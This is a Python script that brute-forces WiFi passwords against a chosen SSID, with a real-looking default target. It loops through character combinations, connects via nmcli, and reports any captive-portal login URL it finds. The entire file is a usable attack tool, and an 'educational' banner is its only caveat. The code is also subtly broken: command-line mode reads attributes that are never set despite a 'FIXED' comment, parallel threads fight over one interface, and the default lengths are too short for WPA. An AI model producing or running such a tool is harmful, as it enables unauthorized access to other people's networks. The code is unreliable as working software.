#!/usr/bin/env python3
"""
WiFi Password Cracker - Enhanced Version
A tool for testing WiFi network security through brute-force password attacks.
"""

# Main execution command - 
#   "python3 wifi_cracker.py --interactive"

import subprocess
import requests
import itertools
import string
import argparse
import logging
import sys
import time
import signal
from threading import Thread, Event, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path

# -----------------------------
# Configuration and Constants
# -----------------------------

@dataclass
class Config:
    """Configuration settings for the WiFi cracker."""
    default_ssid: str = 'SkiTheEast'
    default_password_lengths: List[int] = None
    characters: str = string.ascii_letters + string.digits + string.punctuation
    request_timeout: int = 5
    delay_between_attempts: float = 0.05
    max_workers: int = 4
    log_file: str = "wifi_cracker.log"
    batch_size: int = 1000
    max_memory_percent: int = 85
    resource_check_interval: int = 100
    
    def __post_init__(self):
        if self.default_password_lengths is None:
            self.default_password_lengths = [4, 5]

# Global configuration
config = Config()

# Event to handle graceful termination
terminate_event = Event()
log_lock = Lock()

# -----------------------------
# Logging Setup
# -----------------------------

def setup_logging(verbose: bool = False)  -> None:
    """Configure logging with file and console output."""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    # Create log directory if it doesn't exist
    log_path = Path(config.log_file)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s [%(levelname)s] %(message)s',  # Fixed the format string
        handlers=[
            logging.FileHandler(config.log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    global logger
    logger = logging.getLogger(__name__)

# -----------------------------
# Network Operations
# -----------------------------

class WiFiManager:
    """Manages WiFi connections and network detection."""
    
    @staticmethod
    def connect_to_wifi(ssid: str, password: str) -> bool:
        """
        Attempts to connect to the specified WiFi network using nmcli.
        
        Args:
            ssid: The SSID of the WiFi network
            password: The password for the WiFi network
            
        Returns:
            True if connection is successful, False otherwise
        """
        try:
            # First, disconnect from any existing connection
            disconnect_cmd = ['nmcli', 'dev', 'disconnect', 'wlan0']
            subprocess.run(disconnect_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Attempt to connect
            connect_cmd = ['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password]
            result = subprocess.run(
                connect_cmd, 
                check=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                timeout=10
            )
            
            with log_lock:
                logger.info(f"✅ Successfully connected to: {ssid}")
            return True
            
        except subprocess.CalledProcessError as e:
            with log_lock:
                logger.debug(f"❌ Failed to connect: {e.stderr.decode().strip()}")
            return False
        except subprocess.TimeoutExpired:
            with log_lock:
                logger.debug(f"⏰ Connection attempt timed out")
            return False
        except Exception as e:
            with log_lock:
                logger.error(f"⚠️ Unexpected error: {e}")
            return False
    
    @staticmethod
    def detect_login_url() -> Optional[str]:
        """
        Detects captive portal login URL by checking for redirects.
        
        Returns:
            The detected login URL if redirection occurs, else None
        """
        test_urls = [
            "http://www.google.com",
            "http://httpbin.org/redirect/1",
            "http://example.com"
        ]
        
        for test_url in test_urls:
            try:
                response = requests.get(
                    test_url, 
                    allow_redirects=True, 
                    timeout=config.request_timeout
                )
                
                if response.history:
                    login_url = response.url
                    with log_lock:
                        logger.info(f"🔍 Detected login URL: {login_url}")
                    return login_url
                    
            except requests.RequestException:
                continue
        
        with log_lock:
            logger.info("🔎 No captive portal detected")
        return None
    
    @staticmethod
    def verify_connection(ssid: str) -> bool:
        """
        Verifies that we're actually connected to the correct network.
        
        Args:
            ssid: Expected SSID
            
        Returns:
            True if connected to correct network, False otherwise
        """
        try:
            result = subprocess.run(
                ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show', '--active'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            active_connections = result.stdout.strip().split('\n')
            for conn in active_connections:
                if ssid in conn and '802-11-wireless' in conn:
                    return True
            return False
            
        except Exception:
            return False

# -----------------------------
# Password Generation
# -----------------------------

class PasswordGenerator:
    """Generates password combinations for brute-force attacks."""
    
    @staticmethod
    def generate_combinations(length: int, charset: str = None) -> itertools.product:
        """
        Generates all possible combinations of specified length.
        
        Args:
            length: Length of passwords to generate
            charset: Character set to use (defaults to config.characters)
            
        Yields:
            Password combinations as tuples
        """
        if charset is None:
            charset = config.characters
            
        return itertools.product(charset, repeat=length)
    
    @staticmethod
    def estimate_combinations(lengths: List[int], charset: str = None) -> int:
        """
        Estimates total number of password combinations.
        
        Args:
            lengths: List of password lengths
            charset: Character set to use
            
        Returns:
            Total number of combinations
        """
        if charset is None:
            charset = config.characters
            
        total = 0
        for length in lengths:
            total += len(charset) ** length
        return total

# -----------------------------
# Resource Monitoring
# -----------------------------

import psutil

def check_system_resources() -> bool:
    """Check if system resources are critically low."""
    try:
        memory = psutil.virtual_memory()
        if memory.percent > config.max_memory_percent:
            with log_lock:
                logger.warning(f"⚠️ High memory usage: {memory.percent}% - Pausing...")
            return False
        
        cpu = psutil.cpu_percent(interval=1)
        if cpu > 90:
            with log_lock:
                logger.warning(f"⚠️ High CPU usage: {cpu}% - Pausing...")
            return False
            
        return True
    except Exception:
        return True  # Continue if monitoring fails

# -----------------------------
# Cracking Engine
# -----------------------------

class WiFiCracker:
    """Main password cracking engine."""
    
    def __init__(self, ssid: str, password_lengths: List[int]):
        self.ssid = ssid
        self.password_lengths = password_lengths
        self.wifi_manager = WiFiManager()
        self.password_generator = PasswordGenerator()
        self.attempts = 0
        self.start_time = None
        
    def try_password(self, password: str) -> Tuple[bool, Optional[str]]:
        """
        Attempts to connect using a single password.
        
        Args:
            password: Password to try
            
        Returns:
            Tuple of (success, login_url)
        """
        if terminate_event.is_set():
            return False, None
            
        self.attempts += 1
        
        # Resource check every N attempts
        if self.attempts % config.resource_check_interval == 0:
            if not check_system_resources():
                time.sleep(2)  # Pause to allow system recovery
        
        with log_lock:
            logger.debug(f"🔑 Attempt {self.attempts}: {password}")
        
        success = self.wifi_manager.connect_to_wifi(self.ssid, password)
        
        if success:
            # Verify we're connected to the right network
            if self.wifi_manager.verify_connection(self.ssid):
                login_url = self.wifi_manager.detect_login_url()
                return True, login_url
            else:
                # Connected but to wrong network, disconnect
                subprocess.run(['nmcli', 'dev', 'disconnect', 'wlan0'], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(config.delay_between_attempts)
        return False, None
    
    def crack_passwords_parallel(self) -> Optional[Tuple[str, Optional[str]]]:
        """
        Attempts to crack passwords using parallel processing with resource limits.
        
        Returns:
            Tuple of (password, login_url) if successful, None otherwise
        """
        self.start_time = time.time()
        total_combinations = self.password_generator.estimate_combinations(
            self.password_lengths, config.characters
        )
        
        with log_lock:
            logger.info(f"🔓 WiFi Password Cracker Started")
            logger.info(f"📡 Target SSID: {self.ssid}")
            logger.info(f"🔑 Password Lengths: {self.password_lengths}")
            logger.info(f"🔢 Total Combinations: {total_combinations:,}")
            logger.info(f"🚀 Starting parallel brute-force with {config.max_workers} workers...")
        
        with ThreadPoolExecutor(max_workers=config.max_workers) as executor:
            for length in self.password_lengths:
                if terminate_event.is_set():
                    break
                    
                with log_lock:
                    logger.info(f"🔍 Trying passwords of length: {length}")
                
                # Generate and process passwords in batches
                password_batch = []
                batch_count = 0
                
                for combo in self.password_generator.generate_combinations(length):
                    if terminate_event.is_set():
                        break
                        
                    password = ''.join(combo)
                    password_batch.append(password)
                    
                    # Process batch when it reaches the batch size
                    if len(password_batch) >= config.batch_size:
                        batch_count += 1
                        
                        # Submit batch to executor
                        futures = {
                            executor.submit(self.try_password, pwd): pwd 
                            for pwd in password_batch
                        }
                        
                        # Check results as they complete
                        for future in as_completed(futures):
                            if terminate_event.is_set():
                                break
                                
                            success, login_url = future.result()
                            if success:
                                elapsed = time.time() - self.start_time
                                with log_lock:
                                    logger.info(f"🎉 SUCCESS! Password found: {futures[future]}")
                                    logger.info(f"⏱️ Time elapsed: {elapsed:.2f} seconds")
                                    logger.info(f"🔢 Total attempts: {self.attempts}")
                                    if login_url:
                                        logger.info(f"🌐 Login URL: {login_url}")
                                return futures[future], login_url
                        
                        # Clear the batch
                        password_batch.clear()
                        
                        # Progress update
                        if batch_count % 10 == 0:  # Every 10 batches
                            with log_lock:
                                logger.info(f"📊 Processed {batch_count * config.batch_size:,} passwords...")
                        
                        # Small delay to prevent system overload
                        time.sleep(0.1)
                
                # Process remaining passwords in the last batch
                if password_batch and not terminate_event.is_set():
                    futures = {
                        executor.submit(self.try_password, pwd): pwd 
                        for pwd in password_batch
                    }
                    
                    for future in as_completed(futures):
                        if terminate_event.is_set():
                            break
                            
                        success, login_url = future.result()
                        if success:
                            elapsed = time.time() - self.start_time
                            with log_lock:
                                logger.info(f"🎉 SUCCESS! Password found: {futures[future]}")
                                logger.info(f"⏱️ Time elapsed: {elapsed:.2f} seconds")
                                logger.info(f"🔢 Total attempts: {self.attempts}")
                                if login_url:
                                    logger.info(f"🌐 Login URL: {login_url}")
                            return futures[future], login_url
        
        return None
    
    def crack_passwords_sequential(self) -> Optional[Tuple[str, Optional[str]]]:
        """
        Attempts to crack passwords sequentially (fallback method).
        
        Returns:
            Tuple of (password, login_url) if successful, None otherwise
        """
        self.start_time = time.time()
        
        with log_lock:
            logger.info(f"🔓 WiFi Password Cracker Started (Sequential Mode)")
            logger.info(f"📡 Target SSID: {self.ssid}")
            logger.info(f"🔑 Password Lengths: {self.password_lengths}")
        
        for length in self.password_lengths:
            if terminate_event.is_set():
                break
                
            with log_lock:
                logger.info(f"🔍 Trying passwords of length: {length}")
            
            for combo in self.password_generator.generate_combinations(length):
                if terminate_event.is_set():
                    break
                    
                password = ''.join(combo)
                success, login_url = self.try_password(password)
                
                if success:
                    elapsed = time.time() - self.start_time
                    with log_lock:
                        logger.info(f"🎉 SUCCESS! Password found: {password}")
                        logger.info(f"⏱️ Time elapsed: {elapsed:.2f} seconds")
                        logger.info(f"🔢 Total attempts: {self.attempts}")
                        if login_url:
                            logger.info(f"🌐 Login URL: {login_url}")
                    return password, login_url
        
        return None

# -----------------------------
# Interactive Input Functions
# -----------------------------

def get_target_ssid() -> str:
    """
    Interactive prompt for user to input target SSID.
    
    Returns:
        The SSID entered by the user
    """
    print("\n" + "="*60)
    print("🎯 TARGET SELECTION")
    print("="*60)
    print("Please enter the SSID of the WiFi network you want to test.")
    print("This should be the exact network name as it appears in your WiFi list.\n")
    
    while True:
        ssid = input("📡 Enter target SSID: ").strip()
        
        if not ssid:
            print("❌ SSID cannot be empty. Please try again.")
            continue
        
        # Confirm the selection
        print(f"\n🔍 You selected: '{ssid}'")
        confirm = input("Is this correct? (y/n): ").strip().lower()
        
        if confirm in ['y', 'yes']:
            return ssid
        elif confirm in ['n', 'no']:
            print("Let's try again...")
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

def get_password_lengths() -> List[int]:
    """
    Interactive prompt for user to input password lengths.
    
    Returns:
        List of password lengths
    """
    print("\n" + "="*60)
    print("🔑 PASSWORD LENGTH CONFIGURATION")
    print("="*60)
    print("Enter the password lengths you want to test (space-separated).")
    print("Example: 4 5 6 will test all 4, 5, and 6 character passwords\n")
    
    while True:
        input_str = input("🔢 Enter password lengths (e.g., 4 5 6): ").strip()
        
        if not input_str:
            print("❌ Please enter at least one password length.")
            continue
        
        try:
            lengths = [int(x.strip()) for x in input_str.split()]
            
            # Validate lengths
            if any(length <= 0 for length in lengths):
                print("❌ Password lengths must be positive numbers.")
                continue
            
            if any(length > 12 for length in lengths):
                print("⚠️ Warning: Password lengths > 12 will take extremely long time!")
                confirm = input("Continue anyway? (y/n): ").strip().lower()
                if confirm not in ['y', 'yes']:
                    continue
            
            # Confirm the selection
            print(f"\n🔍 You selected lengths: {lengths}")
            confirm = input("Is this correct? (y/n): ").strip().lower()
            
            if confirm in ['y', 'yes']:
                return lengths
            elif confirm in ['n', 'no']:
                print("Let's try again...")
            else:
                print("Invalid input. Please enter 'y' or 'n'.")
                
        except ValueError:
            print("❌ Invalid input. Please enter numbers separated by spaces.")

def show_advanced_options() -> dict:
    """
    Interactive prompt for advanced configuration options.
    
    Returns:
        Dictionary of advanced options
    """
    print("\n" + "="*60)
    print("⚙️ ADVANCED CONFIGURATION")
    print("="*60)
    print("Configure advanced settings or press Enter to use defaults.\n")
    
    options = {}
    
    # Max workers
    workers_input = input(f"🚀 Max parallel workers (default: {config.max_workers}): ").strip()
    if workers_input:
        try:
            options['max_workers'] = int(workers_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['max_workers'] = config.max_workers  # Set default explicitly
    else:
        options['max_workers'] = config.max_workers  # Set default when Enter is pressed
    
    # Delay between attempts
    delay_input = input(f"⏱️ Delay between attempts in seconds (default: {config.delay_between_attempts}): ").strip()
    if delay_input:
        try:
            options['delay_between_attempts'] = float(delay_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['delay_between_attempts'] = config.delay_between_attempts
    else:
        options['delay_between_attempts'] = config.delay_between_attempts
    
    # Batch size
    batch_input = input(f"📦 Batch size (default: {config.batch_size}): ").strip()
    if batch_input:
        try:
            options['batch_size'] = int(batch_input)
        except ValueError:
            print("⚠️ Invalid input, using default.")
            options['batch_size'] = config.batch_size
    else:
        options['batch_size'] = config.batch_size
    
    # Sequential mode
    sequential_input = input("🔄 Use sequential mode instead of parallel? (y/n, default: n): ").strip().lower()
    if sequential_input in ['y', 'yes']:
        options['sequential'] = True
    else:
        options['sequential'] = False  # Explicitly set default
    
    return options
# -----------------------------
# Utility Functions
# -----------------------------

def graceful_exit(signum=None, frame=None) -> None:
    """Handle graceful termination signals."""
    with log_lock:
        logger.info("🛑 Termination signal received. Stopping...")
    terminate_event.set()

def print_banner() -> None:
    """Print application banner."""
    banner = """
╔══════════════════════════════════════════════════════════╗
║                    WiFi Password Cracker                 ║
║                 Enhanced Version v2.1                    ║
║           For Educational &amp; Security Testing Only       ║
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

# -----------------------------
# Argument Parsing
# -----------------------------

def parse_arguments() -> argparse.Namespace:
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        description="WiFi Password Cracker - Enhanced Version",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -s MyNetwork -l 4 5 6
  %(prog)s --ssid "WiFi Name" --lengths 8 --verbose
  %(prog)s -s TestNetwork -l 4 --workers 8 --delay 0.01
  %(prog)s --interactive  # Use interactive mode
        """
    )
    
    parser.add_argument(
        '-s', '--ssid',
        type=str,
        help='SSID of target WiFi network'
    )
    
    parser.add_argument(
        '-l', '--lengths',
        type=int,
        nargs='+',
        help='Password lengths to attempt'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose logging for debugging'
    )
    
    parser.add_argument(
        '-w', '--workers',
        type=int,
        help=f'Number of parallel workers (default: {config.max_workers})'
    )
    
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help=f'Delay between attempts in seconds (default: {config.delay_between_attempts})'
    )
    
    parser.add_argument(
        '--charset',
        type=str,
        default=config.characters,
        help='Custom character set for password generation'
    )
    
    parser.add_argument(
        '--sequential',
        action='store_true',
        help='Use sequential cracking instead of parallel'
    )
    
    parser.add_argument(
        '-i', '--interactive',
        action='store_true',
        help='Use interactive mode for configuration'
    )
    
    return parser.parse_args()

# -----------------------------
# Main Function
# -----------------------------

def main() -> None:
    """Main entry point of the application."""
    # Parse arguments
    args = parse_arguments()
    
    # Interactive mode or missing arguments
    if args.interactive or not args.ssid:
        print_banner()
        print("🎮 Welcome to Interactive Mode!")
        print("Let's configure your WiFi penetration test step by step.\n")
        
        # Get target SSID
        ssid = get_target_ssid() if not args.ssid else args.ssid
        
        # Get password lengths
        password_lengths = get_password_lengths() if not args.lengths else args.lengths
        
        # Get advanced options
        advanced_options = show_advanced_options()
        
        # Update args with interactive inputs
        args.ssid = ssid
        args.lengths = password_lengths
        args.max_workers = advanced_options.get('max_workers') or args.workers or config.max_workers
        args.delay_between_attempts = advanced_options.get('delay_between_attempts') or args.delay or config.delay_between_attempts
        args.sequential = advanced_options.get('sequential', args.sequential)
                
    else:
        # Use command-line arguments
        if not args.lengths:
            args.lengths = config.default_password_lengths
        if not args.workers:
            args.workers = config.max_workers
        if not args.delay:
            args.delay = config.delay_between_attempts
        
        print_banner()
    
    # Update config with arguments - FIXED VERSION
    config.characters = args.charset
    config.max_workers = args.max_workers  # ✅ Fixed!
    config.delay_between_attempts = args.delay_between_attempts  # ✅ Fixed!
    
    # Setup logging
    setup_logging(args.verbose)
    
    # Register signal handlers
    try:
        signal.signal(signal.SIGINT, graceful_exit)
        signal.signal(signal.SIGTERM, graceful_exit)
    except Exception as e:
        logger.warning(f"⚠️ Could not set signal handlers: {e}")
    
    # Create and run cracker
    cracker = WiFiCracker(args.ssid, args.lengths)
    
    try:
        if args.sequential:
            result = cracker.crack_passwords_sequential()
        else:
            result = cracker.crack_passwords_parallel()
        
        if result is None:
            elapsed = time.time() - cracker.start_time
            with log_lock:
                logger.warning("⚠️ Password not found within specified lengths")
                logger.info(f"⏱️ Total time elapsed: {elapsed:.2f} seconds")
                logger.info(f"🔢 Total attempts made: {cracker.attempts}")
    
    except KeyboardInterrupt:
        logger.info("👋 User interrupted the process")
    
    except Exception as e:
        logger.error(f"💥 Unexpected error: {e}")
    
    finally:
        logger.info("🔚 Script execution completed")

if __name__ == "__main__":
    main()
